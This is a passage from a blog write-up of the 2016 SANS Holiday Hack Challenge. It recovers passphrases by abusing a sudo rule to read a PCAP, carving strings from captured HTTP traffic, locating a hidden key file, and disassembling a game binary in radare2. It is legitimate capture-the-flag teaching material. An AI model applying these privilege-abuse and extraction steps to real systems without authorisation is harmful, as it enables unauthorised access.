&lt;span class="go"&gt;    env_reset, mail_badpass,&lt;/span&gt;
&lt;span class="go"&gt;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin&lt;/span&gt;
&lt;span class="go"&gt;User scratchy may run the following commands on 8bb89db76dd2:&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;    (itchy) NOPASSWD: /usr/sbin/tcpdump&lt;/span&gt;
&lt;/span&gt;&lt;span class="hll"&gt;&lt;span class="go"&gt;    (itchy) NOPASSWD: /usr/bin/strings&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that I had a readable copy of the PCAP file, I extracted the content of
this PCAP, by base64 encoding, so that I could analyze it on my own machine.
You can download the PCAP file &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/out.pcap"&gt;here&lt;/a&gt;
(sha256: &lt;code&gt;07ec6f56c937fc939c8eb64c454ece277f8c1e4f8b851781ce7f4451d48ec985&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;We can now open the PCAP file in Wireshark, which is a hell of a lot nicer than
analyzing it on the terminal:&lt;/p&gt;
&lt;img alt="wireshark_pcap.png" class="align-center" src="/images/sans-christmas-challenge-2016/wireshark_pcap.png" /&gt;
&lt;p&gt;We can see a request to a file called &lt;code&gt;firsthalf.html&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/firsthalf.html&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Wget/1.17.1 (darwin15.2.0)&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;identity&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;192.168.188.130&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Keep-Alive&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.0&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SimpleHTTP/0.6 Python/2.7.12+&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:28:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/html&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;113&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:25:35 GMT&lt;/span&gt;

&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;head&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;input&lt;/span&gt; &lt;span class="na"&gt;type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;part1&amp;quot;&lt;/span&gt; &lt;span class="na"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;santasli&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;/&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;form&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;body&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;html&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We have the first half of our passphrase, &lt;code&gt;santasli&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Now, to take a look at the second half. We can see that there is another
HTTP request, for the second half:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/secondhalf.bin&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;User-Agent&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Wget/1.17.1 (darwin15.2.0)&lt;/span&gt;
&lt;span class="na"&gt;Accept&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;*/*&lt;/span&gt;
&lt;span class="na"&gt;Accept-Encoding&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;identity&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;192.168.188.130&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Keep-Alive&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.0&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;SimpleHTTP/0.6 Python/2.7.12+&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:28:00 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;application/octet-stream&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;1048097&lt;/span&gt;
&lt;span class="na"&gt;Last-Modified&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Fri, 02 Dec 2016 11:26:12 GMT&lt;/span&gt;

L}*.O..r.v./....v....z{.x.&amp;#39;.l.(..@.1].X...k7.?.../.B..G.FPj.`~.%.....a~.;90.cLgc.q2..`.D.x...V....6...........@...x. %JK...kO...Idw..&amp;lt;..G.\.
....... .....(.._.1sf..)$mg@..=.*
........
[snip]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can see that a lot of binary content is being downloaded. I extracted it,
and tried to identify it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; file secondhalf.bin
&lt;span class="go"&gt;secondhalf.bin: data&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Uh oh, &lt;code&gt;file&lt;/code&gt; was not able to identify the type of file. Maybe the start
of the file is just garbage, but there are some files carved later in the file.
Let's use &lt;code&gt;binwalk&lt;/code&gt;, it should give us something to work with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; binwalk secondhalf.bin

&lt;span class="go"&gt;DECIMAL       HEXADECIMAL     DESCRIPTION&lt;/span&gt;
&lt;span class="go"&gt;--------------------------------------------------------------------------------&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Damn, nothing. Maybe &lt;code&gt;foremost&lt;/code&gt; will have more luck?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; foremost secondhalf.bin
&lt;span class="go"&gt;Processing: secondhalf.bin&lt;/span&gt;
&lt;span class="go"&gt;|*|&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; cat output/audit.txt
&lt;span class="go"&gt;Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus&lt;/span&gt;
&lt;span class="go"&gt;Audit File&lt;/span&gt;

&lt;span class="go"&gt;Foremost started at Mon Dec 26 00:44:48 2016&lt;/span&gt;
&lt;span class="go"&gt;Invocation: foremost secondhalf.bin&lt;/span&gt;
&lt;span class="go"&gt;Output directory: output&lt;/span&gt;
&lt;span class="go"&gt;Configuration file: /etc/foremost.conf&lt;/span&gt;
&lt;span class="go"&gt;------------------------------------------------------------------&lt;/span&gt;
&lt;span class="go"&gt;File: secondhalf.bin&lt;/span&gt;
&lt;span class="go"&gt;Start: Mon Dec 26 00:44:48 2016&lt;/span&gt;
&lt;span class="go"&gt;Length: 1009 KB (1033943 bytes)&lt;/span&gt;

&lt;span class="go"&gt;Num  Name (bs=512)         Size  File Offset     Comment&lt;/span&gt;

&lt;span class="go"&gt;Finish: Mon Dec 26 00:44:48 2016&lt;/span&gt;

&lt;span class="go"&gt;0 FILES EXTRACTED&lt;/span&gt;

&lt;span class="go"&gt;------------------------------------------------------------------&lt;/span&gt;

&lt;span class="go"&gt;Foremost finished at Mon Dec 26 00:44:48 2016&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Still nothing... Is this file completely random? Let's use &lt;code&gt;ent&lt;/code&gt; to
measure the entropy of the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ent secondhalf.bin
&lt;span class="go"&gt;Entropy = 7.999841 bits per byte.&lt;/span&gt;

&lt;span class="go"&gt;Optimum compression would reduce the size&lt;/span&gt;
&lt;span class="go"&gt;of this 1033943 byte file by 0 percent.&lt;/span&gt;

&lt;span class="go"&gt;Chi square distribution for 1033943 samples is 227.29, and randomly&lt;/span&gt;
&lt;span class="go"&gt;would exceed this value 75.00 percent of the times.&lt;/span&gt;

&lt;span class="go"&gt;Arithmetic mean value of data bytes is 127.4329 (127.5 = random).&lt;/span&gt;
&lt;span class="go"&gt;Monte Carlo value for Pi is 3.145233080 (error 0.12 percent).&lt;/span&gt;
&lt;span class="go"&gt;Serial correlation coefficient is -0.001185 (totally uncorrelated = 0.0).&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;With these kinds of results, we can be pretty sture that this file is random.
The logical thing is to assume that it's some kind of encrypted file. What's
more, by looking at the end of the capture file, we can see some Dropbox LAN
Sync Discovery Protocol:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
{&amp;quot;host_int&amp;quot;: 266670160730277518981342002975279884847, &amp;quot;version&amp;quot;: [2, 0], &amp;quot;displayname&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;port&amp;quot;: 17500, &amp;quot;namespaces&amp;quot;: [1149071040, 1139770785, 1357103393, 1296963687, 1139786665, 1261247053, 1331126254, 1179166992, 1210559602, 1261612467, 1223790038, 1234538553, 1304191898, 1246301403, 1056298300, 1207374239]}
&lt;/pre&gt;
&lt;p&gt;With this, I was pretty sure to have it the jackpot! I spent the whole day
reading documentation on Dropbox attacks, relying on the knowledge of this
&lt;code&gt;host_int&lt;/code&gt; parameter... and a &lt;code&gt;host_id&lt;/code&gt; parameter, which was
impossible to find anywhere. I tried to use the &lt;code&gt;host_int&lt;/code&gt; paramter
directly as a decryption key, with several &lt;code&gt;openssl&lt;/code&gt; algorithm, but, of
course, to no avail.&lt;/p&gt;
&lt;p&gt;In a move of desperation, I went to &lt;a class="reference external" href="https://reddit.com/r/netsec"&gt;/r/netsec&lt;/a&gt;,
in order to find some clue on this particular part (I was weak, I'm sorry).
&lt;a class="reference external" href="https://www.reddit.com/r/netsec/comments/5hmlkj/the_2016_sans_holiday_hack_challenge/db5qoes/"&gt;This comment&lt;/a&gt;
really turned things around:&lt;/p&gt;
&lt;blockquote&gt;
What types of strings does the strings utility look for, by default? #hint&lt;/blockquote&gt;
&lt;p&gt;With this clue, I immediatly found out. By default, &lt;code&gt;strings&lt;/code&gt; looks for
strings with a minimum length of 4, &lt;strong&gt;with a default encoding of 7-bit ASCII&lt;/strong&gt;.
The binary data probably contained a string encoding in another form. I
immediatly tried 16-bit big endian:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; strings -e b secondhalf.bin
&lt;span class="hll"&gt;&lt;span class="go"&gt;art2:ttlehelper&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;My error here was to assume that the binary data was in fact an encrypted blob.
Anyway, the second half is &lt;code&gt;ttlehelper&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Passphrase: &lt;code&gt;santaslittlehelper&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="workshop-first-door"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id5"&gt;Workshop, first door&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
* To open the door, find the passphrase file deep in the directories.         *
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;According to the &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Motd_%28Unix%29"&gt;motd&lt;/a&gt;, there
is on the file system a file containing the passphrase to the door. We can
use the &lt;code&gt;find&lt;/code&gt; command to list every file on the file system:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; find / -type f &lt;span class="m"&gt;2&lt;/span&gt;&amp;gt; /dev/null &amp;gt; ~/files.txt
&lt;span class="gp"&gt;$&lt;/span&gt; head ~/files.txt
&lt;span class="go"&gt;/home/elf/files.txt&lt;/span&gt;
&lt;span class="go"&gt;/home/elf/.bashrc&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;/home/elf/.doormat/. / /\/\\/Don&amp;#39;t Look Here!/You are persistent, aren&amp;#39;t you?/&amp;#39;/key_for_the_door.txt&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;/home/elf/.profile&lt;/span&gt;
&lt;span class="go"&gt;/home/elf/.bash_logout&lt;/span&gt;
&lt;span class="go"&gt;/etc/hosts&lt;/span&gt;
&lt;span class="go"&gt;/etc/resolv.conf&lt;/span&gt;
&lt;span class="go"&gt;/etc/hostname&lt;/span&gt;
&lt;span class="go"&gt;/etc/shadow&lt;/span&gt;
&lt;span class="go"&gt;/etc/passwd-&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The higlighted file seems interesting. However, there's a lot of tricky
characters in the path, and tabulation autocomplete is disabled on this
terminal. However, we can use some shell-fu to get the content of the file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; find ~/.doormat -name &lt;span class="s2"&gt;&amp;quot;key_for_the_door.txt&amp;quot;&lt;/span&gt; -exec cat &lt;span class="o"&gt;{}&lt;/span&gt; &lt;span class="se"&gt;\;&lt;/span&gt;
&lt;span class="go"&gt;key: open_sesame&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passphrase: &lt;code&gt;open_sesame&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With this passphrase, we can open the door, which gives us access to Santa's
office.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="santa-s-office"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id6"&gt;Santa's office&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;When you interact with the terminal in Santa's office, you get greeted by this
prompt:&lt;/p&gt;
&lt;img alt="santa_office_wargames.png" class="align-center" src="/images/sans-christmas-challenge-2016/santa_office_wargames.png" /&gt;
&lt;p&gt;By &lt;a class="reference external" href="https://duckduckgo.com/?q=greetings+professor+falken"&gt;DuckDuckGoing&lt;/a&gt;
this sentence, we can find that it's a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/WarGames"&gt;WarGames&lt;/a&gt;
reference. Now, I haven't seen WarGames (I know, shame on me), but I managed to
find &lt;a class="reference external" href="https://www.youtube.com/watch?v=KXzNo0vR_dU"&gt;a clip&lt;/a&gt; with the
necessary commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    GREETINGS PROFESSOR FALKEN.

&lt;span class="hll"&gt;    Hello.
&lt;/span&gt;
    HOW ARE YOU FEELING TODAY?

&lt;span class="hll"&gt;    I&amp;#39;m fine. How are you?
&lt;/span&gt;
    EXCELLENT, IT&amp;#39;S BEEN A LONG TIME. CAN YOU EXPLAIN THE REMOVAL OF YOUR USER ACCOUNT ON 6
    /23/73?

&lt;span class="hll"&gt;    People sometimes make mistakes.
&lt;/span&gt;
    YES THEY DO. SHALL WE PLAY A GAME?

&lt;span class="hll"&gt;    Love to. How about Global Thermonuclear War?
&lt;/span&gt;
    WOULDN&amp;#39;T YOU PREFER A GOOD GAME OF CHESS?

&lt;span class="hll"&gt;    Later. Let&amp;#39;s play Global Thermonuclear War.
&lt;/span&gt;
    FINE

    ,------~~v,_         _                     _--^\
     |&amp;#39;          \   ,__/ ||                 _/    /,_ _
    /             \,/     /         ,,  _,,/^         v v-___
    |                    /          |&amp;#39;~^                     \
    \                   |         _/                     _ _/^
     \                 /         /                   ,~~^/ |
      ^~~_       _ _   /          |          __,, _v__\   \/
          &amp;#39;~~,  , ~ \ \           ^~       /    ~   //
              \/     \/             \~,  ,/
                                       ~~
       UNITED STATES                   SOVIET UNION
    WHICH SIDE DO YOU WANT?
         1.    UNITED STATES
         2.    SOVIET UNION
    PLEASE CHOOSE ONE:
&lt;span class="hll"&gt;    2
&lt;/span&gt;
    AWAITING FIRST STRIKE COMMAND
    -----------------------------
    PLEASE LIST PRIMARY TARGETS BY
CITY AND/OR COUNTRY NAME:

&lt;span class="hll"&gt;Las Vegas
&lt;/span&gt;
LAUNCH INITIATED, HERE&amp;#39;S THE KEY FOR YOUR TROUBLE:
LOOK AT THE PRETTY LIGHTS
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passphrase: &lt;code&gt;LOOK AT THE PRETTY LIGHTS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With this passphrase, you can access a new room called the corridor.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-corridor"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id7"&gt;The corridor&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;There's no terminal in this room, only a password protected door. Let's put
a pin on this for now.&lt;/p&gt;
&lt;img alt="the_corridor_password_protected.png" class="align-center" src="/images/sans-christmas-challenge-2016/the_corridor_password_protected.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="workshop-second-door"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id8"&gt;Workshop, second door&lt;/a&gt;&lt;/h3&gt;
&lt;pre class="literal-block"&gt;
*******************************************************************************
*                                                                             *
* Find the passphrase from the wumpus. Play fair or cheat; it's up to you.    *
*                                                                             *
*******************************************************************************
&lt;/pre&gt;
&lt;p&gt;On this terminal, we have a kind of game, looking a lot like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Hunt_the_Wumpus"&gt;Hunt the Wumpus&lt;/a&gt;, where we have to go
down a dungeon, slay the wumpus, and get the passphrase from it.&lt;/p&gt;
&lt;img alt="wumpus_launch.png" class="align-center" src="/images/sans-christmas-challenge-2016/wumpus_launch.png" /&gt;
&lt;p&gt;However, instead of playing the game, we chan cheat, as the motd suggests, by
analyzing the binary to extract the passphrase. We can extract the
&lt;code&gt;wumpus&lt;/code&gt; binary by base64-encoding it on the board, copying the result,
then base64-decoding it on our analysis machine. You can get a copy of the
executable &lt;a class="reference external" href="/docs/sans-christmas-challenge-2016/wumpus"&gt;here&lt;/a&gt; (sha256:
&lt;code&gt;10412d7773a5d3a49e5a5facdc5aa386a4e3eaec7dca83bc769a104e1790c1fd&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;If we look at the list of functions we can see one called &lt;code&gt;kill_wump&lt;/code&gt;. By
looking at the disassembly of this function, using radare2 (God, I've got to
learn how to use this tool, there seems to be a steep learning curve!), we can
see that this function is called when you managed to kill the wumpus, and gives
you the passphrase:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;[0x00605118]&amp;gt; pdf @ fcn.kill_wump&lt;/span&gt;
&lt;span class="go"&gt;/ (fcn) fcn.kill_wump 546&lt;/span&gt;
&lt;span class="go"&gt;|   fcn.kill_wump ();&lt;/span&gt;
&lt;span class="go"&gt;|           ; var int local_8h @ rbp-0x8&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402644      55             push rbp&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402645      4889e5         mov rbp, rsp&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402648      4883ec10       sub rsp, 0x10&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040264c      bf38354000     mov edi, str._thwock____groan___crash__n_nA_horrible_roar_fills_the_cave__and_you_realize__with_a_smile__that_you_nhave_slain_the_evil_Wumpus_and_won_the_game___You_don_t_want_to_tarry_for_nlong__however__because_not_only_is_the_Wumpus_famous__but_the_stench_of_ndead_Wumpus_is_also_quite_well_known__a_stench_plenty_enough_to_slay_the_nmightiest_adventurer_at_a_single_whiff__ ; &amp;quot;*thwock!* *groan* *crash*..A horrible roar fills the cave, and you realize, with a smile, that you.have slain the evil Wumpus and won the game!  You don&amp;#39;t want to tarry for.long, however, because not only is the Wumpus famous, but the stench of.dead Wumpus is also quite well known, a stench plenty enough to slay the.mightiest adventurer at a single whiff!!&amp;quot; @ 0x403538&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402651      e85ae4ffff     call sym.imp.puts          ; int puts(const char *s);&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402656      bf18000000     mov edi, 0x18               ; &amp;quot;0.@&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040265b      e8f0e4ffff     call sym.imp.malloc        ;  void *malloc(size_t size);&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402660      488945f8       mov qword [rbp - local_8h], rax&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402664      488b05cd2a20.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040266b      0fb65009       movzx edx, byte [rax + 9]   ; [0x9:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040266f      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402673      8810           mov byte [rax], dl&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402675      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402679      488d5001       lea rdx, [rax + 1]          ; 0x1&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040267d      488b05bc2a20.  mov rax, qword [obj.m5]     ; [0x605140:8]=0x402a60 str.We_have_no_future_because_our_present_is_too_volatile._We_have_only_risk_management. LEA obj.m5 ; &amp;quot;`*@&amp;quot; @ 0x605140&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402684      0fb6400e       movzx eax, byte [rax + 0xe] ; [0xe:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402688      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040268a      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040268e      488d5002       lea rdx, [rax + 2]          ; 0x2&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402692      488b059f2a20.  mov rax, qword [obj.m4]     ; [0x605138:8]=0x402a08 str.When_you_want_to_know_how_things_really_work__study_them_when_they_re_coming_apart LEA obj.m4 ; obj.m4&lt;/span&gt;
&lt;span class="go"&gt;|           0x00402699      0fb64037       movzx eax, byte [rax + 0x37] ; [0x37:1]=0 ; &amp;#39;7&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040269d      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x0040269f      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026a3      488d5003       lea rdx, [rax + 3]          ; 0x3&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026a7      488b05722a20.  mov rax, qword [obj.m0]     ; [0x605120:8]=0x402970 str.The_sky_above_the_port_was_the_color_of_television__tuned_to_a_dead_channel. LEA obj.m0 ; &amp;quot;p)@&amp;quot; @ 0x605120&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026ae      0fb64012       movzx eax, byte [rax + 0x12] ; [0x12:1]=62&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026b2      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026b4      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026b8      488d5004       lea rdx, [rax + 4]          ; 0x4&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026bc      488b05852a20.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026c3      0fb6401d       movzx eax, byte [rax + 0x1d] ; [0x1d:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026c7      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026c9      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026cd      488d5005       lea rdx, [rax + 5]          ; 0x5&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026d1      488b05582a20.  mov rax, qword [obj.m2]     ; [0x605130:8]=0x4029d8 str.The_street_finds_its_own_uses_for_things. LEA obj.m2 ; obj.m2&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026d8      0fb64004       movzx eax, byte [rax + 4]   ; [0x4:1]=2&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026dc      8802           mov byte [rdx], al&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026de      488b45f8       mov rax, qword [rbp - local_8h]&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026e2      488d5006       lea rdx, [rax + 6]          ; 0x6&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026e6      488b055b2a20.  mov rax, qword [obj.m6]     ; [0x605148:8]=0x402ab8 str.Stand_high_long_enough_and_your_lightning_will_come. LEA obj.m6 ; obj.m6&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026ed      0fb64016       movzx eax, byte [rax + 0x16] ; [0x16:1]=0&lt;/span&gt;
&lt;span class="go"&gt;|           0x004026f1      8802           mov byte [rdx], al&lt;/span&gt;
